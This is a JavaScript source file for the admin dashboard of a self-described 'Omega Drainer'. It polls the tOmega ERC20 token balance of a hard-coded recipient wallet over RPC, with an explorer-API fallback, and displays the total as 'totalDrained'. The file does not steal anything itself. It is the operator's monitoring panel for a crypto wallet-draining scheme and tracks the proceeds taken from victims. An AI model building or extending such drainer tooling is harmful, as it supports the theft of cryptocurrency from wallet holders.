// Omega Drainer - Admin Dashboard / Monitor
// Runs inside Omega OS - Uses RPC only (No MetaMask required)
// NOW TRACKING: tOmega ERC20 Token

const RECIPIENT_ADDRESS = "0x9B51b8b0C69B7F07DfCdfebc8Fd579a99D7DAad0";
const TOMEGA_ADDRESS = "0x82C88F75d3DA75dF268cda532CeC8B101da8Fa51";
const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)"
];

// USER SPECIFIED RPC (Primary)
const RPC_ENDPOINTS = [
    "https://0x4e454228.rpc.aurora-cloud.dev"
];

let provider;
let totalVal = 0;

function log(message, type = 'info') {
    const logDiv = document.getElementById('logPanel');
    const entry = document.createElement('div');
    entry.className = `log-entry`;

    // Time
    const timeSpan = document.createElement('span');
    timeSpan.className = 'log-time';
    timeSpan.textContent = new Date().toLocaleTimeString();

    // Message
    const msgSpan = document.createElement('span');
    msgSpan.className = type === 'success' ? 'log-success' : (type === 'error' ? 'log-error' : '');
    msgSpan.textContent = message;

    entry.appendChild(timeSpan);
    entry.appendChild(msgSpan);
    logDiv.insertBefore(entry, logDiv.firstChild);
}

async function initMonitor() {
    try {
        log('Initializing Monitor Daemon...', 'info');
        log('Tracking: tOmega ERC20 Token', 'info');
        document.getElementById('contractDisplay').textContent = RECIPIENT_ADDRESS;

        // Connect directly to RPC
        provider = new ethers.providers.JsonRpcProvider(RPC_ENDPOINTS[0]);

        log(`Connected to Omega Network`, 'success');
        log(`Monitoring wallet: ${RECIPIENT_ADDRESS.substring(0, 10)}...`, 'info');

        // Fetch initial balance (with fallback)
        await fetchBalance();

        // Listen for new blocks and check for tOmega transfers
        try {
            provider.on("block", async (blockNumber) => {
                try {
                    // Re-fetch tOmega balance on each new block
                    await fetchBalance();
                } catch (err) {
                    console.error("Block Error:", err);
                }
            });
        } catch (e) {
            log('RPC Listen Failed. Using polling.', 'warning');
        }

    } catch (e) {
        log(`RPC Error: ${e.message}`, 'error');
        log(`Switching to Polling Mode...`, 'info');
        // Fallback: Poll every 30 seconds
        await fetchBalance();
        setInterval(fetchBalance, 30000);
    }
}

async function fetchBalance() {
    try {
        // Try RPCs for tOmega ERC20 balance
        for (const rpc of RPC_ENDPOINTS) {
            try {
                const tempProvider = new ethers.providers.JsonRpcProvider(rpc);
                const tOmegaContract = new ethers.Contract(TOMEGA_ADDRESS, ERC20_ABI, tempProvider);
                const balance = await tOmegaContract.balanceOf(RECIPIENT_ADDRESS);
                const tokenBalance = parseFloat(ethers.utils.formatEther(balance));
                updateStats(tokenBalance);
                return; // Success
            } catch (rpcErr) {
                console.error("RPC Error:", rpcErr);
            }
        }

        // API Fallback for tOmega token balance
        const apiUrl = `https://explorer.omeganetwork.co/api?module=account&action=tokenbalance&contractaddress=${TOMEGA_ADDRESS}&address=${RECIPIENT_ADDRESS}`;

        if (window.electronAPI && window.electronAPI.fetchWebsite) {
            try {
                const rawResponse = await window.electronAPI.fetchWebsite(apiUrl);
                let data = null;
                if (typeof rawResponse === 'string') {
                    try {
                        data = JSON.parse(rawResponse);
                    } catch (e) { }
                } else if (typeof rawResponse === 'object') {
                    data = rawResponse;
                }

                if (data && data.status === "1" && data.result) {
                    const tokenBalance = parseFloat(ethers.utils.formatEther(data.result));
                    updateStats(tokenBalance);
                    return;
                }
            } catch (sysErr) { }
        }

        // Last Resort: Standard Fetch (Likely Blocked)
        const response = await fetch(apiUrl);
        const data = await response.json();
        if (data.status === "1" && data.result) {
            const tokenBalance = parseFloat(ethers.utils.formatEther(data.result));
            updateStats(tokenBalance);
        }

    } catch (err) {
        console.error("Fetch Balance Error:", err);
    }
}

function updateStats(amount) {
    totalVal = amount;
    document.getElementById('totalDrained').textContent = `${totalVal.toFixed(4)}`;

    // Animate
    const el = document.getElementById('totalDrained');
    el.style.color = '#fff';
    setTimeout(() => el.style.color = '#10b981', 200);
}

// Start
document.addEventListener('DOMContentLoaded', initMonitor);
